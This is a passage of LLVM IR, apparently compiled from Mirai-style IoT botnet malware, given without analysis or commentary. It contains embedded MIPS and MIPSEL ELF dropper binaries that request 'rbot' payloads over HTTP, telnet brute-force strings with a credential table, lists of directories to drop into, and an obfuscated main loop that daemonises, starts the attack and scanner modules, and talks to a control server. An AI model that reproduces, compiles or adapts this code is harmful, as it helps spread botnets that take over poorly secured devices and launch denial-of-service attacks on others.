!\8F\99\80@\00\00\00\00\03 \00\08\00\00\00\00\00\00\00\00<\1C\00\05'\9C\80\A0\03\99\E0!'\BD\FF\E0\AF\BF\00\1C\AF\B0\00\18\AF\BC\00\10\8F\99\804\00\00\00\00\03 \F8\09\00\80\80!\8F\BC\00\10\ACP\00\00\8F\BF\00\1C\8F\B0\00\18$\02\FF\FF\03\E0\00\08'\BD\00 \00\00\00\00\00\00\00\00<\1C\00\05'\9C\80P\03\99\E0!\8F\82\800\03\E0\00\08\00\00\00\00\00\00\00\00\00\00\00\00mips\00\00\00\00.rbot.binary\00\00\00\00GET /rbot.mips HTTP/1.0\0D\0A\0D\0A\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\80\00\00\00\00@\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00D\06 \00@\05`\00@\01\9C\00@\02\10\00@\05\10\00@\01(\00@\01t\00@\00\A0\00@\01\C4\00@\00\C8\00@\00\E4\00@\04\A0\00@\01\00\00.shstrtab\00.text\00.rodata\00.got\00.bss\00.mdebug.abi32\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\0B\00\00\00\01\00\00\00\06\00@\00\A0\00\00\00\A0\00\00\04\E0\00\00\00\00\00\00\00\00\00\00\00\10\00\00\00\00\00\00\00\11\00\00\00\01\00\00\002\00@\05\80\00\00\05\80\00\00\004\00\00\00\00\00\00\00\00\00\00\00\04\00\00\00\01\00\00\00\19\00\00\00\01\10\00\00\03\00D\05\C0\00\00\05\C0\00\00\00T\00\00\00\00\00\00\00\00\00\00\00\10\00\00\00\04\00\00\00\1E\00\00\00\08\00\00\00\03\00D\06 \00\00\06\14\00\00\00\10\00\00\00\00\00\00\00\00\00\00\00\10\00\00\00\00\00\00\00#\00\00\00\01\00\00\00\00\00\00\00H\00\00\06\14\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\01\00\00\00\00\00\00\00\01\00\00\00\03\00\00\00\00\00\00\00\00\00\00\06\14\00\00\001\00\00\00\00\00\00\00\00\00\00\00\01\00\00\00\00\00", align 1
@.str.19 = private unnamed_addr constant [1921 x i8] c"\7FELF\01\01\01\00\00\00\00\00\00\00\00\00\02\00\08\00\01\00\00\00\84\04@\004\00\00\00h\06\00\00\07\10\00\004\00 \00\03\00(\00\07\00\06\00\01\00\00\00\00\00\00\00\00\00@\00\00\00@\00\D4\05\00\00\D4\05\00\00\05\00\00\00\00\00\01\00\01\00\00\00\E0\05\00\00\E0\05D\00\E0\05D\00T\00\00\00p\00\00\00\06\00\00\00\00\00\01\00Q\E5td\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\07\00\00\00\04\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\FF\00\A50\00,\05\00\00&\04\00% \85\00\FF\00\E70\FF\00\C60% \87\00\002\06\00%0\C4\00\02\22\06\00\00\FF\C30\00\1A\03\00\00\FF\840\00\16\06\00\026\06\00%\10C\00%0\C4\00\08\00\E0\03%\10F\00\05\00\1C<\E4\84\9C'!\E0\99\03\5C\80\99\8F!(\80\00\08\00 \03\A1\0F\04$\05\00\1C<\C8\84\9C'!\E0\99\03\5C\80\99\8F!(\80\00\08\00 \03\A6\0F\04$\05\00\1C<\AC\84\9C'!\E0\99\03!\10\A0\00\5C\80\99\8F!8\C0\00!(\80\00!0@\00\08\00 \03\A5\0F\04$\05\00\1C<\84\84\9C'!\E0\99\03\D0\FF\BD'(\00\BF\AF\10\00\BC\AF\5C\80\99\8F\18\00\A4\AF\1C\00\A5\AF \00\A6\AF\06\10\04$\18\00\A6'\09\F8 \03\03\00\05$\10\00\BC\8F(\00\BF\8F\00\00\00\00\08\00\E0\030\00\BD'\05\00\1C<8\84\9C'!\E0\99\03!\10\A0\00\5C\80\99\8F!8\C0\00!(\80\00!0@\00\08\00 \03\A4\0F\04$\05\00\1C<\10\84\9C'!\E0\99\03!\10\A0\00\5C\80\99\8F!8\C0\00!(\80\00!0@\00\08\00 \03\A3\0F\04$\05\00\1C<\E8\83\9C'!\E0\99\03\D0\FF\BD'(\00\BF\AF\10\00\BC\AF\5C\80\99\8F\18\00\A4\AF\1C\00\A5\AF \00\A6\AF\06\10\04$\18\00\A6'\09\F8 \03\01\00\05$\10\00\BC\8F(\00\BF\8F\00\00\00\00\08\00\E0\030\00\BD'\05\00\1C<\9C\83\9C'!\E0\99\03@\FF\BD'\BC\00\BF\AF\B8\00\B2\AF\B4\00\B1\AF\B0\00\B0\AF\10\00\BC\AF\18\80\82\8F\00\00\00\00\A0\05P$\00\00\02\82\00\00\00\00\FD\FF@\14\01\00\10&\FF\FF\10&\02\00\02$\1C\00\A2\A7\00P\02$\1E\00\A2\A7\18\80\82\8FL\80\99\8F\D0\00\07$\B0\00\04$k\00\05$\85\00\06$\A0\05B$\09\F8 \03#\80\02\02\10\00\BC\8F\01\03\05$\18\80\84\8F`\80\99\8F\A8\05\84$\FF\01\06$\09\F8 \03 \00\A2\AF\10\00\BC\8F\02\00\04$P\80\99\8F\02\00\05$!0\00\00\09\F8 \03!\90@\00!\88@\00\FF\FF\02$\10\00\BC\8F\03\00\22\12\00\00\00\00\07\00B\16\00\00\00\00T\80\99\8F\00\00\00\00\09\F8 \03\01\00\04$\10\00\BC\8F\00\00\00\00D\80\99\8F!  \02\1C\00\A5'\09\F8 \03\10\00\06$\10\00\BC\8F\07\00A\04\00\00\00\00T\80\99\8F\00\00\00\00\09\F8 \03# \02\00\10\00\BC\8F\00\00\00\00\18\80\85\8FH\80\99\8F\17\00\10&\B8\05\A5$!  \02\09\F8 \03!0\00\02\10\00\BC\8F\07\00P\10!\80\00\00T\80\99\8F\00\00\00\00\09\F8 \03\03\00\04$\10\00\BC\8F!\80\00\008\80\99\8F!  \02\18\00\A5'\09\F8 \03\01\00\06$\10\00\BC\8F\01\00\03$T\80\99\8F\04\00C\10\04\00\04$\09\F8 \03\00\00\00\00\10\00\BC\8F\18\00\A3\83\00\12\10\00%\80C\00\0A\0D\02<\0A\0DB4\ED\FF\02\16\00\00\00\008\80\99\8F,\00\B0'!  \02!(\00\02\09\F8 \03\80\00\06$\10\00\BC\8F!(\00\02H\80\99\8F!0@\00\06\00@\18! @\02\09\F8 \03\00\00\00\00\10\00\BC\8F\F0\FF\00\10\00\00\00\00X\80\99\8F\00\00\00\00\09\F8 \03!  \02\10\00\BC\8F\00\00\00\00X\80\99\8F\00\00\00\00\09\F8 \03! @\02\10\00\BC\8F\00\00\00\00T\80\99\8F\00\00\00\00\09\F8 \03\05\00\04$\10\00\BC\8F\BC\00\BF\8F\B8\00\B2\8F\B4\00\B1\8F\B0\00\B0\8F\08\00\E0\03\C0\00\BD'\05\00\1C<L\81\9C'!\E0\99\03!\00\E0\03\01\00\11\04\00\00\00\00\05\00\1C<4\81\9C'!\E0\9F\03!\F8\00\00<\80\99\8F\00\00\00\00\08\00 \03\00\00\00\00\00\00\00\00\05\00\1C<\10\81\9C'!\E0\99\03!\10\80\00! \A0\00!(\C0\00!0\E0\00\10\00\A7\8F\14\00\A8\8F\18\00\A9\8F\1C\00\AA\8F\E0\FF\BD'\10\00\A8\AF\14\00\A9\AF\18\00\AA\AF\1C\00\A2\AF\1C\00\A2\8F\0C\00\00\00\03\00\E0\14 \00\BD'\08\00\E0\03\00\00\00\00! @\00@\80\99\8F\00\00\00\00\08\00 \03\00\00\00\00\00\00\00\00\05\00\1C<\A0\80\9C'!\E0\99\03\E0\FF\BD'\1C\00\BF\AF\18\00\B0\AF\10\00\BC\AF4\80\99\8F\00\00\00\00\09\F8 \03!\80\80\00\10\00\BC\8F\00\00P\AC\1C\00\BF\8F\18\00\B0\8F\FF\FF\02$\08\00\E0\03 \00\BD'\00\00\00\00\00\00\00\00\05\00\1C<P\80\9C'!\E0\99\030\80\82\8F\08\00\E0\03\00\00\00\00\00\00\00\00\00\00\00\00mpsl\00\00\00\00.rbot.binary\00\00\00\00GET /rbot.mpsl HTTP/1.0\0D\0A\0D\0A\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\80\00\00@\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00@\06D\00\80\05@\00\C0\01@\004\02@\000\05@\00L\01@\00\98\01@\00\A0\00@\00\E8\01@\00\EC\00@\00\08\01@\00\C0\04@\00$\01@\00\00.shstrtab\00.text\00.rodata\00.got\00.bss\00.mdebug.abi32\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\0B\00\00\00\01\00\00\00\06\00\00\00\A0\00@\00\A0\00\00\00\00\05\00\00\00\00\00\00\00\00\00\00\10\00\00\00\00\00\00\00\11\00\00\00\01\00\00\002\00\00\00\A0\05@\00\A0\05\00\004\00\00\00\00\00\00\00\00\00\00\00\04\00\00\00\01\00\00\00\19\00\00\00\01\00\00\00\03\00\00\10\E0\05D\00\E0\05\00\00T\00\00\00\00\00\00\00\00\00\00\00\10\00\00\00\04\00\00\00\1E\00\00\00\08\00\00\00\03\00\00\00@\06D\004\06\00\00\10\00\00\00\00\00\00\00\00\00\00\00\10\00\00\00\00\00\00\00#\00\00\00\01\00\00\00\00\00\00\00H\00\00\004\06\00\00\00\00\00\00\00\00\00\00\00\00\00\00\01\00\00\00\00\00\00\00\01\00\00\00\03\00\00\00\00\00\00\00\00\00\00\004\06\00\001\00\00\00\00\00\00\00\00\00\00\00\01\00\00\00\00\00\00\00\00", align 1
@.str.148 = private unnamed_addr constant [11 x i8] c"sage: wget\00", align 1
@.str.149 = private unnamed_addr constant [11 x i8] c"sage: tftp\00", align 1
@.str.4 = private unnamed_addr constant [6 x i8] c"/tmp/\00", align 1
@.str.1.5 = private unnamed_addr constant [6 x i8] c"/var/\00", align 1
@.str.2.6 = private unnamed_addr constant [6 x i8] c"/dev/\00", align 1
@.str.3.7 = private unnamed_addr constant [6 x i8] c"/mnt/\00", align 1
@.str.4.8 = private unnamed_addr constant [10 x i8] c"/var/run/\00", align 1
@.str.5 = private unnamed_addr constant [10 x i8] c"/var/tmp/\00", align 1
@.str.6 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.7 = private unnamed_addr constant [15 x i8] c"/dev/netslink/\00", align 1
@.str.8 = private unnamed_addr constant [10 x i8] c"/dev/shm/\00", align 1
@.str.9 = private unnamed_addr constant [6 x i8] c"/bin/\00", align 1
@.str.10 = private unnamed_addr constant [6 x i8] c"/etc/\00", align 1
@.str.11 = private unnamed_addr constant [7 x i8] c"/boot/\00", align 1
@.str.12 = private unnamed_addr constant [6 x i8] c"/usr/\00", align 1
@.str.13 = private unnamed_addr constant [11 x i8] c"/var/Sofia\00", align 1
@.str.14 = private unnamed_addr constant [2 x i8] c".\00", align 1
@.str.128 = private unnamed_addr constant [9 x i8] c"FINISHED\00", align 1
@.str.129 = private unnamed_addr constant [7 x i8] c"BRUTED\00", align 1
@.str.127 = private unnamed_addr constant [68 x i8] c"[%d.%d.%d.%d:23] [%s:%s] [%s] [Status:%s] [Method:%d] [Attempt #%d]\00", align 1
@.str.136 = private unnamed_addr constant [6 x i8] c"ARMv7\00", align 1
@.str.137 = private unnamed_addr constant [6 x i8] c"ARMv6\00", align 1
@.str.138 = private unnamed_addr constant [5 x i8] c"arm7\00", align 1
@.str.131 = private unnamed_addr constant [5 x i8] c"\7FELF\00", align 1
@.str.132 = private unnamed_addr constant [6 x i8] c"arm64\00", align 1
@.str.133 = private unnamed_addr constant [4 x i8] c"x86\00", align 1
@.str.134 = private unnamed_addr constant [5 x i8] c"mips\00", align 1
@.str.135 = private unnamed_addr constant [7 x i8] c"mipsel\00", align 1
@.str.139 = private unnamed_addr constant [9 x i8] c"ncorrect\00", align 1
@.str.140 = private unnamed_addr constant [7 x i8] c"nvalid\00", align 1
@.str.141 = private unnamed_addr constant [10 x i8] c"ncomplete\00", align 1
@.str.142 = private unnamed_addr constant [15 x i8] c"attempt failed\00", align 1
@.str.143 = private unnamed_addr constant [6 x i8] c"% Bad\00", align 1
@.str.15 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.144 = private unnamed_addr constant [5 x i8] c"ogin\00", align 1
@.str.145 = private unnamed_addr constant [6 x i8] c"enter\00", align 1
@.str.146 = private unnamed_addr constant [4 x i8] c"ser\00", align 1
@.str.147 = private unnamed_addr constant [8 x i8] c"assword\00", align 1
@consume_iacs.tmp1 = private unnamed_addr constant [3 x i8] c"\FF\FB\1F", align 1
@consume_iacs.tmp2 = private unnamed_addr constant [9 x i8] c"\FF\FA\1F\00P\00\18\FF\F0", align 1
@auth_table_max_weight = global i16 0, align 2
@auth_table_len = global i32 0, align 4
@auth_table = global %struct.scanner_auth* null, align 8

; Function Attrs: noinline nounwind uwtable
define i32 @main(i32, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca [32 x i8], align 16
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.__sigset_t, align 8
  %10 = alloca %struct.__sigset_t, align 8
  %11 = alloca %struct.__sigset_t, align 8
  %12 = alloca %struct.timeval, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i16, align 2
  %20 = alloca %struct.sockaddr_in, align 4
  %21 = alloca i32, align 4
  %22 = alloca %union.__SOCKADDR_ARG, align 8
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca i8, align 1
  %26 = alloca i32, align 4
  %27 = alloca i16, align 2
  %28 = alloca [1024 x i8], align 16
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %8, align 4
  %29 = load i8**, i8*** %5, align 8
  %30 = getelementptr inbounds i8*, i8** %29, i64 0
  %31 = load i8*, i8** %30, align 8
  %32 = call i32 @unlink(i8* %31) #7
  %33 = call i32 @sigemptyset(%struct.__sigset_t* %9) #7
  %34 = call i32 @sigaddset(%struct.__sigset_t* %9, i32 2) #7
  %35 = call i32 @sigprocmask(i32 0, %struct.__sigset_t* %9, %struct.__sigset_t* null) #7
  %36 = call void (i32)* @signal(i32 17, void (i32)* inttoptr (i64 1 to void (i32)*)) #7
  %37 = call void (i32)* @signal(i32 1, void (i32)* inttoptr (i64 1 to void (i32)*)) #7
  %38 = call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str, i32 0, i32 0)) #7
  call void @table_init()
  call void @ensure_single_instance()
  call void @rand_init()
  %39 = getelementptr inbounds [32 x i8], [32 x i8]* %6, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %39, i8 0, i64 32, i32 16, i1 false)
  %40 = load i32, i32* %4, align 4
  %41 = icmp eq i32 %40, 2
  br i1 %41, label %42, label %62

; <label>:42:                                     ; preds = %2
  %43 = load i8**, i8*** %5, align 8
  %44 = getelementptr inbounds i8*, i8** %43, i64 1
  %45 = load i8*, i8** %44, align 8
  %46 = call i32 @util_strlen(i8* %45)
  %47 = icmp slt i32 %46, 32
  br i1 %47, label %48, label %62

; <label>:48:                                     ; preds = %42
  %49 = getelementptr inbounds [32 x i8], [32 x i8]* %6, i32 0, i32 0
  %50 = load i8**, i8*** %5, align 8
  %51 = getelementptr inbounds i8*, i8** %50, i64 1
  %52 = load i8*, i8** %51, align 8
  %53 = call i32 @util_strcpy(i8* %49, i8* %52)
  %54 = load i8**, i8*** %5, align 8
  %55 = getelementptr inbounds i8*, i8** %54, i64 1
  %56 = load i8*, i8** %55, align 8
  %57 = load i8**, i8*** %5, align 8
  %58 = getelementptr inbounds i8*, i8** %57, i64 1
  %59 = load i8*, i8** %58, align 8
  %60 = call i32 @util_strlen(i8* %59)
  %61 = sext i32 %60 to i64
  call void @llvm.memset.p0i8.i64(i8* %56, i8 0, i64 %61, i32 1, i1 false)
  br label %65

; <label>:62:                                     ; preds = %42, %2
  %63 = getelementptr inbounds [32 x i8], [32 x i8]* %6, i32 0, i32 0
  %64 = call i32 @util_strcpy(i8* %63, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.1, i32 0, i32 0))
  br label %65

; <label>:65:                                     ; preds = %62, %48
  %66 = load i8**, i8*** %5, align 8
  %67 = getelementptr inbounds i8*, i8** %66, i64 0
  %68 = load i8*, i8** %67, align 8
  %69 = call i32 @util_strcpy(i8* %68, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.2, i32 0, i32 0))
  %70 = call i32 (i32, ...) @prctl(i32 15, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.2, i32 0, i32 0)) #7
  %71 = call i32 @fork() #7
  store i32 %71, i32* @pid1, align 4
  %72 = load i32, i32* @pid1, align 4
  %73 = icmp ne i32 %72, 0
  br i1 %73, label %74, label %75

; <label>:74:                                     ; preds = %65
  call void @exit(i32 1) #8
  unreachable

; <label>:75:                                     ; preds = %65
  %76 = call i32 @fork() #7
  store i32 %76, i32* @pid2, align 4
  %77 = load i32, i32* @pid2, align 4
  %78 = icmp ne i32 %77, 0
  br i1 %78, label %79, label %80

; <label>:79:                                     ; preds = %75
  call void @exit(i32 1) #8
  unreachable

; <label>:80:                                     ; preds = %75
  %81 = call i32 @setsid() #7
  store i32 %81, i32* %7, align 4
  %82 = call i32 @close(i32 0)
  %83 = call i32 @close(i32 1)
  %84 = call i32 @close(i32 2)
  %85 = call signext i8 @attack_init()
  call void (...) bitcast (void ()* @scanner_init to void (...)*)()
  br label %86

; <label>:86:                                     ; preds = %435, %414, %408, %373, %368, %362, %204, %80
  br label %87

; <label>:87:                                     ; preds = %86
  %88 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %10, i32 0, i32 0
  %89 = getelementptr inbounds [16 x i64], [16 x i64]* %88, i64 0, i64 0
  %90 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %89) #7, !srcloc !1
  %91 = extractvalue { i64, i64* } %90, 0
  %92 = extractvalue { i64, i64* } %90, 1
  %93 = trunc i64 %91 to i32
  store i32 %93, i32* %15, align 4
  %94 = ptrtoint i64* %92 to i64
  %95 = trunc i64 %94 to i32
  store i32 %95, i32* %16, align 4
  br label %96

; <label>:96:                                     ; preds = %87
  br label %97

; <label>:97:                                     ; preds = %96
  %98 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %99 = getelementptr inbounds [16 x i64], [16 x i64]* %98, i64 0, i64 0
  %100 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %99) #7, !srcloc !2
  %101 = extractvalue { i64, i64* } %100, 0
  %102 = extractvalue { i64, i64* } %100, 1
  %103 = trunc i64 %101 to i32
  store i32 %103, i32* %17, align 4
  %104 = ptrtoint i64* %102 to i64
  %105 = trunc i64 %104 to i32
  store i32 %105, i32* %18, align 4
  br label %106

; <label>:106:                                    ; preds = %97
  %107 = load i32, i32* @fd_ctrl, align 4
  %108 = icmp ne i32 %107, -1
  br i1 %108, label %109, label %124

; <label>:109:                                    ; preds = %106
  %110 = load i32, i32* @fd_ctrl, align 4
  %111 = srem i32 %110, 64
  %112 = zext i32 %111 to i64
  %113 = shl i64 1, %112
  %114 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %10, i32 0, i32 0
  %115 = load i32, i32* @fd_ctrl, align 4
  %116 = sdiv i32 %115, 64
  %117 = sext i32 %116 to i64
  %118 = getelementptr inbounds [16 x i64], [16 x i64]* %114, i64 0, i64 %117
  %119 = load i64, i64* %118, align 8
  %120 = and i64 %119, %113
  %121 = xor i64 %119, %113
  %122 = or i64 %120, %121
  %123 = or i64 %119, %113
  store i64 %122, i64* %118, align 8
  br label %124

; <label>:124:                                    ; preds = %109, %106
  %125 = load i32, i32* @fd_serv, align 4
  %126 = icmp eq i32 %125, -1
  br i1 %126, label %127, label %128

; <label>:127:                                    ; preds = %124
  call void @establish_connection()
  br label %128

; <label>:128:                                    ; preds = %127, %124
  %129 = load i8, i8* @pending_connection, align 1
  %130 = icmp ne i8 %129, 0
  br i1 %130, label %131, label %158

; <label>:131:                                    ; preds = %128
  %132 = load i32, i32* @fd_serv, align 4
  %133 = srem i32 %132, 64
  %134 = zext i32 %133 to i64
  %135 = shl i64 1, %134
  %136 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %137 = load i32, i32* @fd_serv, align 4
  %138 = sdiv i32 %137, 64
  %139 = sext i32 %138 to i64
  %140 = getelementptr inbounds [16 x i64], [16 x i64]* %136, i64 0, i64 %139
  %141 = load i64, i64* %140, align 8
  %142 = xor i64 %141, -1
  %143 = xor i64 %135, -1
  %144 = xor i64 8231462464028818747, -1
  %145 = and i64 %142, 8231462464028818747
  %146 = and i64 %141, %144
  %147 = and i64 %143, 8231462464028818747
  %148 = and i64 %135, %144
  %149 = or i64 %145, %146
  %150 = or i64 %147, %148
  %151 = xor i64 %149, %150
  %152 = or i64 %142, %143
  %153 = xor i64 %152, -1
  %154 = or i64 8231462464028818747, %144
  %155 = and i64 %153, %154
  %156 = or i64 %151, %155
  %157 = or i64 %141, %135
  store i64 %156, i64* %140, align 8
  br label %185

; <label>:158:                                    ; preds = %128
  %159 = load i32, i32* @fd_serv, align 4
  %160 = srem i32 %159, 64
  %161 = zext i32 %160 to i64
  %162 = shl i64 1, %161
  %163 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %10, i32 0, i32 0
  %164 = load i32, i32* @fd_serv, align 4
  %165 = sdiv i32 %164, 64
  %166 = sext i32 %165 to i64
  %167 = getelementptr inbounds [16 x i64], [16 x i64]* %163, i64 0, i64 %166
  %168 = load i64, i64* %167, align 8
  %169 = xor i64 %168, -1
  %170 = xor i64 %162, -1
  %171 = xor i64 -7462133569723807386, -1
  %172 = and i64 %169, -7462133569723807386
  %173 = and i64 %168, %171
  %174 = and i64 %170, -7462133569723807386
  %175 = and i64 %162, %171
  %176 = or i64 %172, %173
  %177 = or i64 %174, %175
  %178 = xor i64 %176, %177
  %179 = or i64 %169, %170
  %180 = xor i64 %179, -1
  %181 = or i64 -7462133569723807386, %171
  %182 = and i64 %180, %181
  %183 = or i64 %178, %182
  %184 = or i64 %168, %162
  store i64 %183, i64* %167, align 8
  br label %185

; <label>:185:                                    ; preds = %158, %131
  %186 = load i32, i32* @fd_ctrl, align 4
  %187 = load i32, i32* @fd_serv, align 4
  %188 = icmp sgt i32 %186, %187
  br i1 %188, label %189, label %191

; <label>:189:                                    ; preds = %185
  %190 = load i32, i32* @fd_ctrl, align 4
  store i32 %190, i32* %13, align 4
  br label %193

; <label>:191:                                    ; preds = %185
  %192 = load i32, i32* @fd_serv, align 4
  store i32 %192, i32* %13, align 4
  br label %193

; <label>:193:                                    ; preds = %191, %189
  %194 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 0, i64* %194, align 8
  %195 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 10, i64* %195, align 8
  %196 = load i32, i32* %13, align 4
  %197 = add i32 %196, 46481367
  %198 = add i32 %197, 1
  %199 = sub i32 %198, 46481367
  %200 = add nsw i32 %196, 1
  %201 = call i32 @select(i32 %199, %struct.__sigset_t* %10, %struct.__sigset_t* %11, %struct.__sigset_t* null, %struct.timeval* %12)
  store i32 %201, i32* %14, align 4
  %202 = load i32, i32* %14, align 4
  %203 = icmp eq i32 %202, -1
  br i1 %203, label %204, label %205

; <label>:204:                                    ; preds = %193
  br label %86

; <label>:205:                                    ; preds = %193
  %206 = load i32, i32* %14, align 4
  %207 = icmp eq i32 %206, 0
  br i1 %207, label %208, label %221

; <label>:208:                                    ; preds = %205
  store i16 0, i16* %19, align 2
  %209 = load i32, i32* %8, align 4
  %210 = add i32 %209, 388084281
  %211 = add i32 %210, 1
  %212 = sub i32 %211, 388084281
  %213 = add nsw i32 %209, 1
  store i32 %212, i32* %8, align 4
  %214 = srem i32 %209, 6
  %215 = icmp eq i32 %214, 0
  br i1 %215, label %216, label %220

; <label>:216:                                    ; preds = %208
  %217 = load i32, i32* @fd_serv, align 4
  %218 = bitcast i16* %19 to i8*
  %219 = call i64 @send(i32 %217, i8* %218, i64 2, i32 16384)
  br label %220

; <label>:220:                                    ; preds = %216, %208
  br label %221

; <label>:221:                                    ; preds = %220, %205
  br label %222

; <label>:222:                                    ; preds = %221
  %223 = load i32, i32* @fd_ctrl, align 4
  %224 = icmp ne i32 %223, -1
  br i1 %224, label %225, label %257

; <label>:225:                                    ; preds = %222
  %226 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %10, i32 0, i32 0
  %227 = load i32, i32* @fd_ctrl, align 4
  %228 = sdiv i32 %227, 64
  %229 = sext i32 %228 to i64
  %230 = getelementptr inbounds [16 x i64], [16 x i64]* %226, i64 0, i64 %229
  %231 = load i64, i64* %230, align 8
  %232 = load i32, i32* @fd_ctrl, align 4
  %233 = srem i32 %232, 64
  %234 = zext i32 %233 to i64
  %235 = shl i64 1, %234
  %236 = xor i64 %231, -1
  %237 = xor i64 %235, -1
  %238 = xor i64 -5292337262893790432, -1
  %239 = or i64 %236, %237
  %240 = or i64 -5292337262893790432, %238
  %241 = xor i64 %239, -1
  %242 = and i64 %241, %240
  %243 = and i64 %231, %235
  %244 = icmp ne i64 %242, 0
  br i1 %244, label %245, label %257

; <label>:245:                                    ; preds = %225
  store i32 16, i32* %21, align 4
  %246 = load i32, i32* @fd_ctrl, align 4
  %247 = bitcast %union.__SOCKADDR_ARG* %22 to %struct.sockaddr**
  %248 = bitcast %struct.sockaddr_in* %20 to %struct.sockaddr*
  store %struct.sockaddr* %248, %struct.sockaddr** %247, align 8
  %249 = getelementptr inbounds %union.__SOCKADDR_ARG, %union.__SOCKADDR_ARG* %22, i32 0, i32 0
  %250 = load %struct.sockaddr*, %struct.sockaddr** %249, align 8
  %251 = call i32 @accept(i32 %246, %struct.sockaddr* %250, i32* %21)
  call void @scanner_kill()
  %252 = load i32, i32* @maintain_thread, align 4
  %253 = call i32 @kill(i32 %252, i32 9) #7
  call void @attack_kill_all()
  %254 = load i32, i32* %7, align 4
  %255 = mul nsw i32 %254, -1
  %256 = call i32 @kill(i32 %255, i32 9) #7
  call void @exit(i32 0) #8
  unreachable

; <label>:257:                                    ; preds = %225, %222
  %258 = load i8, i8* @pending_connection, align 1
  %259 = icmp ne i8 %258, 0
  br i1 %259, label %260, label %319

; <label>:260:                                    ; preds = %257
  store i8 0, i8* @pending_connection, align 1
  %261 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %262 = load i32, i32* @fd_serv, align 4
  %263 = sdiv i32 %262, 64
  %264 = sext i32 %263 to i64
  %265 = getelementptr inbounds [16 x i64], [16 x i64]* %261, i64 0, i64 %264
  %266 = load i64, i64* %265, align 8
  %267 = load i32, i32* @fd_serv, align 4
  %268 = srem i32 %267, 64
  %269 = zext i32 %268 to i64
  %270 = shl i64 1, %269
  %271 = xor i64 %266, -1
  %272 = xor i64 %270, -1
  %273 = xor i64 -2951415362051628368, -1
  %274 = or i64 %271, %272
  %275 = or i64 -2951415362051628368, %273
  %276 = xor i64 %274, -1
  %277 = and i64 %276, %275
  %278 = and i64 %266, %270
  %279 = icmp ne i64 %277, 0
  br i1 %279, label %281, label %280

; <label>:280:                                    ; preds = %260
  call void @teardown_connection()
  br label %318

; <label>:281:                                    ; preds = %260
  store i32 0, i32* %23, align 4
  store i32 4, i32* %24, align 4
  %282 = load i32, i32* @fd_serv, align 4
  %283 = bitcast i32* %23 to i8*
  %284 = call i32 @getsockopt(i32 %282, i32 1, i32 4, i8* %283, i32* %24) #7
  %285 = load i32, i32* %23, align 4
  %286 = icmp ne i32 %285, 0
  br i1 %286, label %287, label %298

; <label>:287:                                    ; preds = %281
  %288 = load i32, i32* @fd_serv, align 4
  %289 = call i32 @close(i32 %288)
  store i32 -1, i32* @fd_serv, align 4
  %290 = call i32 @rand_next()
  %291 = urem i32 %290, 10
  %292 = sub i32 0, %291
  %293 = sub i32 0, 1
  %294 = add i32 %292, %293
  %295 = sub i32 0, %294
  %296 = add i32 %291, 1
  %297 = call i32 @sleep(i32 %295)
  br label %317

; <label>:298:                                    ; preds = %281
  %299 = getelementptr inbounds [32 x i8], [32 x i8]* %6, i32 0, i32 0
  %300 = call i32 @util_strlen(i8* %299)
  %301 = trunc i32 %300 to i8
  store i8 %301, i8* %25, align 1
  %302 = call i32 @util_local_addr()
  store i32 %302, i32* @LOCAL_ADDR, align 4
  %303 = load i32, i32* @fd_serv, align 4
  %304 = call i64 @send(i32 %303, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.3, i32 0, i32 0), i64 4, i32 16384)
  %305 = load i32, i32* @fd_serv, align 4
  %306 = call i64 @send(i32 %305, i8* %25, i64 1, i32 16384)
  %307 = load i8, i8* %25, align 1
  %308 = zext i8 %307 to i32
  %309 = icmp sgt i32 %308, 0
  br i1 %309, label %310, label %316

; <label>:310:                                    ; preds = %298
  %311 = load i32, i32* @fd_serv, align 4
  %312 = getelementptr inbounds [32 x i8], [32 x i8]* %6, i32 0, i32 0
  %313 = load i8, i8* %25, align 1
  %314 = zext i8 %313 to i64
